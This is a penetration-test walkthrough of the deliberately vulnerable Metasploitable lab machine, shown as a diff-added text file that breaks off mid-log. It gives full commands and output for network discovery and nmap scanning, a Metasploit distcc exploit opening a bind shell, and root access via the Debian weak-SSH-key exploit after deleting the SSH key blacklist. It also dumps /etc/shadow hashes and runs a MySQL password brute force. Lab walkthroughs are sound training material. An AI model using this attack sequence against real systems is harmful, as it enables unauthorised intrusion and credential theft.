@@ -1,0 +1,3253 @@
+URL : https://www.vulnhub.com/entry/metasploitable-1,28/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+
+ Currently scanning: 192.168.54.0/16   |   Screen View: Unique Hosts                                                                                                                                              
+
+ 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 300                                                                                                                                                  
+ _____________________________________________________________________________ 
+   IP            At MAC Address      Count  Len   MAC Vendor                                                                                                                                                      
+ -----------------------------------------------------------------------------                                                                                                                                    
+ 192.168.174.130 00:0c:29:cd:ac:64    03    180   VMware, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:e9:67:44    02    120   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A 192.168.174.130
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-23 20:40 EST
+Stats: 0:02:28 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 97.73% done; ETC: 20:43 (0:00:00 remaining)
+Nmap scan report for 192.168.174.130
+Host is up (0.00035s latency).
+Not shown: 65505 closed ports
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp    open  telnet      Linux telnetd
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2010-03-17T13:07:45+00:00
+|_Not valid after:  2010-04-16T13:07:45+00:00
+|_ssl-date: 2016-01-24T01:43:01+00:00; -4s from local time.
+53/tcp    open  domain      ISC BIND 9.4.2
+| dns-nsid: 
+|_  bind.version: 9.4.2
+80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Metasploitable2 - Linux
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      53959/tcp  mountd
+|   100005  1,2,3      55571/udp  mountd
+|   100021  1,3,4      43207/tcp  nlockmgr
+|   100021  1,3,4      47609/udp  nlockmgr
+|   100024  1          45424/udp  status
+|_  100024  1          52832/tcp  status
+139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp   open  exec        netkit-rsh rexecd
+513/tcp   open  login?
+514/tcp   open  tcpwrapped
+1099/tcp  open  rmiregistry GNU Classpath grmiregistry
+|_rmi-dumpregistry: Registry listing failed (No return data received from server)
+1524/tcp  open  shell       Metasploitable root shell
+2049/tcp  open  nfs         2-4 (RPC #100003)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      53959/tcp  mountd
+|   100005  1,2,3      55571/udp  mountd
+|   100021  1,3,4      43207/tcp  nlockmgr
+|   100021  1,3,4      47609/udp  nlockmgr
+|   100024  1          45424/udp  status
+|_  100024  1          52832/tcp  status
+2121/tcp  open  ftp         ProFTPD 1.3.1
+3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+| mysql-info: 
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 9
+|   Capabilities flags: 43564
+|   Some Capabilities: SupportsTransactions, Support41Auth, ConnectWithDatabase, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, SupportsCompression, LongColumnFlag
+|   Status: Autocommit
+|_  Salt: .P,&xPb!wY8HCVf}ea6)
+3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp  open  vnc         VNC (protocol 3.3)
+| vnc-info: 
+|   Protocol version: 3.3
+|   Security types: 
+|_    Unknown security type (33554432)
+6000/tcp  open  X11         (access denied)
+6667/tcp  open  irc         Unreal ircd
+|_irc-info: ERROR: Closing Link: [192.168.174.137] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.
+6697/tcp  open  irc         Unreal ircd (Admin email admin@Metasploitable.LAN)
+| irc-info: 
+|   server: irc.Metasploitable.LAN
+|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
+|   servers: 1
+|   users: 1
+|   lservers: 0
+|   lusers: 1
+|   uptime: 0 days, 0:05:05
+|   source host: F7376844.311349B4.FFFA6D49.IP
+|_  source ident: nmap
+8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Apache Tomcat/5.5
+8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+43207/tcp open  nlockmgr    1-4 (RPC #100021)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      53959/tcp  mountd
+|   100005  1,2,3      55571/udp  mountd
+|   100021  1,3,4      43207/tcp  nlockmgr
+|   100021  1,3,4      47609/udp  nlockmgr
+|   100024  1          45424/udp  status
+|_  100024  1          52832/tcp  status
+52832/tcp open  status      1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      53959/tcp  mountd
+|   100005  1,2,3      55571/udp  mountd
+|   100021  1,3,4      43207/tcp  nlockmgr
+|   100021  1,3,4      47609/udp  nlockmgr
+|   100024  1          45424/udp  status
+|_  100024  1          52832/tcp  status
+53959/tcp open  mountd      1-3 (RPC #100005)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      53959/tcp  mountd
+|   100005  1,2,3      55571/udp  mountd
+|   100021  1,3,4      43207/tcp  nlockmgr
+|   100021  1,3,4      47609/udp  nlockmgr
+|   100024  1          45424/udp  status
+|_  100024  1          52832/tcp  status
+55288/tcp open  unknown
+MAC Address: 00:0C:29:CD:AC:64 (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP
+|_  System time: 2016-01-23T20:43:02-05:00
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.35 ms 192.168.174.130
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 165.21 seconds
+root@kali:~# 
+
+3.) Enumerating port 3632/tcp - distccd - distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+In msf
+root@kali:~# msfconsole
+msf > search distcc
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                           Disclosure Date  Rank       Description
+   ----                           ---------------  ----       -----------
+   exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution
+
+
+msf > use exploit/unix/misc/distcc_exec
+msf exploit(distcc_exec) > show options 
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  3632             yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(distcc_exec) > set RHOST 192.168.174.130
+RHOST => 192.168.174.130
+msf exploit(distcc_exec) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_openssl                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf exploit(distcc_exec) > set payload cmd/unix/bind_perl
+payload => cmd/unix/bind_perl
+msf exploit(distcc_exec) > show options 
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.174.130  yes       The target address
+   RPORT  3632             yes       The target port
+
+
+Payload options (cmd/unix/bind_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LPORT  4444             yes       The listen port
+   RHOST  192.168.174.130  no        The target address
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+msf exploit(distcc_exec) > exploit 
+
+[*] Started bind handler
+[*] Command shell session 1 opened (192.168.174.137:55893 -> 192.168.174.130:4444) at 2016-01-23 20:49:39 -0500
+
+ls
+5171.jsvc_up
+pwd
+/tmp
+whoami
+daemon
+ls -lah /root
+total 76K
+drwxr-xr-x 13 root root 4.0K Jan 23 20:37 .
+drwxr-xr-x 21 root root 4.0K May 20  2012 ..
+-rw-------  1 root root  324 Jan 23 20:37 .Xauthority
+lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
+-rw-r--r--  1 root root 2.2K Oct 20  2007 .bashrc
+drwx------  3 root root 4.0K May 20  2012 .config
+drwx------  2 root root 4.0K May 20  2012 .filezilla
+drwxr-xr-x  5 root root 4.0K Jan 23 20:37 .fluxbox
+drwx------  2 root root 4.0K May 20  2012 .gconf
+drwx------  2 root root 4.0K May 20  2012 .gconfd
+drwxr-xr-x  2 root root 4.0K May 20  2012 .gstreamer-0.10
+drwx------  4 root root 4.0K May 20  2012 .mozilla
+-rw-r--r--  1 root root  141 Oct 20  2007 .profile
+drwx------  5 root root 4.0K May 20  2012 .purple
+-rwx------  1 root root    4 May 20  2012 .rhosts
+drwxr-xr-x  2 root root 4.0K May 20  2012 .ssh
+drwx------  2 root root 4.0K Jan 23 20:37 .vnc
+drwxr-xr-x  2 root root 4.0K May 20  2012 Desktop
+-rwx------  1 root root  401 May 20  2012 reset_logs.sh
+-rw-r--r--  1 root root  138 Jan 23 20:37 vnc.log
+ls -lah /root/.ssh
+total 16K
+drwxr-xr-x  2 root root 4.0K May 20  2012 .
+drwxr-xr-x 13 root root 4.0K Jan 23 20:37 ..
+-rw-r--r--  1 root root  405 May 17  2010 authorized_keys
+-rw-r--r--  1 root root  442 May 20  2012 known_hosts
+cat /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+
+In Browser
+https://www.exploit-db.com/exploits/5622/
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/5622.tar.bz2
+
+In Kali
+root@kali:~/Desktop# tar xvjf 5622.tar.bz2 
+rsa/
+rsa/2048/
+rsa/2048/2712a6d5cec99f295a0c468b830a370d-28940.pub
+rsa/2048/eaddc9bba9bf3c0832f443706903cd14-28712.pub
+rsa/2048/0bdcea11b2c628c7fd8bc4b04ca43668-12474
+rsa/2048/3fabfedd883c3cef69881a4fc30fdac7-3828.pub
+rsa/2048/a508919ec49fcf91ad0ecf8472349d9b-3039.pub
+rsa/2048/9ddc1879b9ac311f24a81e835aac5866-28340.pub
+rsa/2048/37cb6c02b84dfab70b7e0ad014a00414-27656.pub
+rsa/2048/17b33876782270d00f0aa284757e82ba-15477.pub
+rsa/2048/be74666ad474495ab736fc3202477d84-6942
+<--- snip --->
+rsa/2048/2df5993a79670bfbf518ccbe1c880698-6057
+rsa/2048/22395760ea6265919ef5db8d26dda56c-17578
+rsa/2048/e311fc52da0d062cd6e9a507a7470db8-15835.pub
+rsa/2048/ae88b6e25a832541ac60978e90fb40fe-28014
+rsa/2048/759ee1c853d2fcc07a13e6867ed75a35-26843
+rsa/2048/22817b9fcfca9c043d6d48dac528b0a6-3298
+rsa/2048/cd84c0196af31046b45037f39208c9c1-11710
+rsa/2048/9634a42c34d72e776593a9f1ddd38085-2633
+rsa/2048/1668b5d4171480a6359c0966ded47550-15730
+rsa/2048/b8a7774ef9e5b9b2b73a685e509b899b-2131
+root@kali:~/Desktop# 
+root@kali:~/Desktop/rsa/2048# grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
+57c3115d77c56390332dc5c49978627a-5429.pub
+root@kali:~/Desktop/rsa/2048#
+
+Might face this error -> 
+root@kali:~/Desktop/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.174.129
+Public key 57:c3:11:5d:77:c5:63:90:33:2d:c5:c4:99:78:62:7a blacklisted (see ssh-vulnkey(1)); refusing to send it
+The authenticity of host '192.168.174.129 (192.168.174.129)' can't be established.
+RSA key fingerprint is 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.174.129' (RSA) to the list of known hosts.
+root@192.168.174.129's password: 
+
+root@kali:~/Desktop/rsa/2048# 
+
+Fix ->
+Navigate to root@kali:/usr/share/ssh#
+Delete "blacklist.RSA-2048" file
+
+Now the exploit should work file
+root@kali:~/Desktop/rsa/2048# ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.174.130
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To access official Ubuntu documentation, please visit:
+http://help.ubuntu.com/
+You have mail.
+root@metasploitable:~# whoami
+root
+root@metasploitable:~# hostname
+metasploitable
+root@metasploitable:~# ifconfig 
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:6e:13:ca  
+          inet addr:192.168.174.130  Bcast:192.168.174.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe6e:13ca/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:49197 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1168 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:2965439 (2.8 MB)  TX bytes:79255 (77.3 KB)
+          Interrupt:17 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:53165 (51.9 KB)  TX bytes:53165 (51.9 KB)
+
+root@metasploitable:~# cat /etc/shadow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+root@metasploitable:~#
+
+4.) Enumerating port - 3306/tcp - mysql - MySQL 5.0.51a-3ubuntu5
+In msf
+root@kali:~# msfconsole
+msf > search mysql
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                  Disclosure Date  Rank       Description
+   ----                                                  ---------------  ----       -----------
+   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
+   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     Ruby on Rails Devise Authentication Password Reset
+   auxiliary/admin/mysql/mysql_enum                                       normal     MySQL Enumeration Module
+   auxiliary/admin/mysql/mysql_sql                                        normal     MySQL SQL Generic Query
+   auxiliary/admin/tikiwiki/tikidblib                    2006-11-01       normal     TikiWiki Information Disclosure
+   auxiliary/analyze/jtr_mysql_fast                                       normal     John the Ripper MySQL Password Cracker (Fast Mode)
+   auxiliary/gather/joomla_weblinks_sqli                 2014-03-02       normal     Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
+   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal     MySQL Authentication Bypass Password Dump
+   auxiliary/scanner/mysql/mysql_file_enum                                normal     MYSQL File/Directory Enumerator
+   auxiliary/scanner/mysql/mysql_hashdump                                 normal     MYSQL Password Hashdump
+   auxiliary/scanner/mysql/mysql_login                                    normal     MySQL Login Utility
+   auxiliary/scanner/mysql/mysql_schemadump                               normal     MYSQL Schema Dump
+   auxiliary/scanner/mysql/mysql_version                                  normal     MySQL Server Version Enumeration
+   auxiliary/server/capture/mysql                                         normal     Authentication Capture: MySQL
+   exploit/linux/mysql/mysql_yassl_getname               2010-01-25       good       MySQL yaSSL CertDecoder::GetName Buffer Overflow
+   exploit/linux/mysql/mysql_yassl_hello                 2008-01-04       good       MySQL yaSSL SSL Hello Message Buffer Overflow
+   exploit/multi/http/manage_engine_dc_pmp_sqli          2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
+   exploit/unix/webapp/kimai_sqli                        2013-05-21       average    Kimai v0.9.2 'db_restore.php' SQL Injection
+   exploit/unix/webapp/wp_google_document_embedder_exec  2013-01-03       normal     WordPress Plugin Google Document Embedder Arbitrary File Disclosure
+   exploit/windows/mysql/mysql_mof                       2012-12-01       excellent  Oracle MySQL for Microsoft Windows MOF Execution
+   exploit/windows/mysql/mysql_payload                   2009-01-16       excellent  Oracle MySQL for Microsoft Windows Payload Execution
+   exploit/windows/mysql/mysql_start_up                  2012-12-01       excellent  Oracle MySQL for Microsoft Windows FILE Privilege Abuse
+   exploit/windows/mysql/mysql_yassl_hello               2008-01-04       average    MySQL yaSSL SSL Hello Message Buffer Overflow
+   exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential
+   post/linux/gather/enum_configs                                         normal     Linux Gather Configurations
+   post/linux/gather/enum_users_history                                   normal     Linux Gather User History
+   post/multi/manage/dbvis_add_db_admin                                   normal     Multi Manage DbVisualizer Add Db Admin
+
+
+msf > use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(mysql_login) > show options 
+
+Module options (auxiliary/scanner/mysql/mysql_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             3306             yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(mysql_login) > set RHOSTS 192.168.174.130
+RHOSTS => 192.168.174.130
+msf auxiliary(mysql_login) > set USERNAME root
+USERNAME => root
+msf auxiliary(mysql_login) > set PASS_FILE /root/elitehacker.txt
+PASS_FILE => /root/elitehacker.txt
+msf auxiliary(mysql_login) > exploit 
+
+[*] 192.168.174.130:3306 MYSQL - Found remote MySQL version 5.0.51a
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:123456 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:password (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:12345 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:passport (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:diablo (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:alpha (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:12345678 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:1 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:zxcvbnm (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:trustno1 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:shit (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:monkey (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:hello (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:elite (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:abc123 (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:windows (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:thunder (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:thomas (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:therock (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:sony (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:robert (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:random (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:qwerty (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:qazwsx (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
+[-] 192.168.174.130:3306 MYSQL - LOGIN FAILED: root:presario (Incorrect: Access denied for user 'root'@'192.168.174.137' (using password: YES))
+[!] No active DB -- Credential data will not be saved!
